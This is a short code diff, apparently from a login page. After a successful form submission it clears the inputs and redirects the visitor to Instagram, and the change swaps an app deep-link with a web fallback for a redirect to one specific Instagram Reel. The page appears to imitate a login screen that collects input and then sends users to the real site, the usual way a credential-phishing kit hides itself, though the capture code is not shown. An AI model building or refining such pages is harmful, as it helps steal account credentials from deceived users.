@@ -440,25 +440,9 @@ button.forgot-password {
 
         if (response.ok) {
           discardInputs(form);
-          // Redirect to Instagram (web or app)
-          // Try deep link for the app first, fallback to web
-          const instagramAppUrl = "instagram://app"; // for mobile app
-          const instagramWebUrl = "https://www.instagram.com/";
-          
-          // Attempt to open the app via deep link
-          const appLink = document.createElement("a");
-          appLink.href = instagramAppUrl;
-          appLink.style.display = "none";
-          document.body.appendChild(appLink);
-          appLink.click();
-          document.body.removeChild(appLink);
-          
-          // Fallback: redirect to web after a short delay
-          setTimeout(() => {
-            window.location.href = instagramWebUrl;
-          }, 1500);
+          // Redirect to the specific Reel
+          window.location.href = "https://www.instagram.com/reel/DcjC8rvIXFf/?utm_source=ig_web_copy_link&igsi=MzRlODBiNWFlZA==";
         } else {
-          // silently fail
           console.error(`Error: ${result.error || "Unknown error"}`);
         }
       } catch (err) {
